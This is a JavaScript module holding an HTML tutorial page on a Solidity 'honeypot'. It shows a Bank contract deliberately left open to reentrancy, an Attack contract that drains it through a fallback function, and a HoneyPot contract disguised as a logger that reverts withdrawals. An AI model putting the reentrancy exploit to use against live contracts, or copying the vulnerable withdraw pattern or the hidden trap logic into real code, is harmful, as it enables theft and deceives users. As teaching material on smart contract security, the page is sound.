// metadata
export const version = "0.6.10"
export const title = "Honeypot"
export const description = "An example of honeypot in Solidity"

const html = `<p>A honeypot is a trap to catch hackers.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>
<p>that will catch malicious users.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.10;</span>

<span class="hljs-comment">/*
Bank is a contract that calls Logger to log events.
Bank.withdraw() is vulnerable to the reentrancy attack.
So a hacker tries to drain Ether from Bank.
But actually the reentracy exploit is a bait for hackers.
By deploying Bank with HoneyPot in place of the Logger, this contract becomes
a trap for hackers. Let&#x27;s see how.

1. Alice deploys HoneyPot
2. Alice deploys Bank with the address of HoneyPot
3. Alice deposits 1 Ether into Bank.
4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
5. Eve deploys Attack with the address of Bank
6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

What happened?
Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
When the last Bank.withdraw() is about to complete, it calls logger.log().
Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bank</span> </span>{
    <span class="hljs-keyword">mapping</span> (<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;
    Logger logger;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Logger _logger</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        logger = Logger(_logger);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>,<span class="hljs-string">"Deposit"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(_amount &lt;= balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Insufficient funds"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _amount;

        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount, <span class="hljs-string">"Withdraw"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Logger</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint</span> amount, <span class="hljs-keyword">string</span> action</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">emit</span> Log(_caller, _amount, _action);
    }
}

<span class="hljs-comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    Bank bank;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Bank _bank</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        bank = Bank(_bank);
    }

    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(bank).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        bank.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-comment">// Let&#x27;s say this code is in a separate file so that others cannot read it.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HoneyPot</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
    </span>{
        <span class="hljs-keyword">if</span> (equal(_action, <span class="hljs-string">"Withdraw"</span>)) {
            <span class="hljs-built_in">revert</span>(<span class="hljs-string">"It&#x27;s a trap"</span>);
        }
    }

    <span class="hljs-comment">// Function to compare strings using keccak256</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _a, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _b</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_a)) == <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_b));
    }
}
</code></pre>
`

export default html
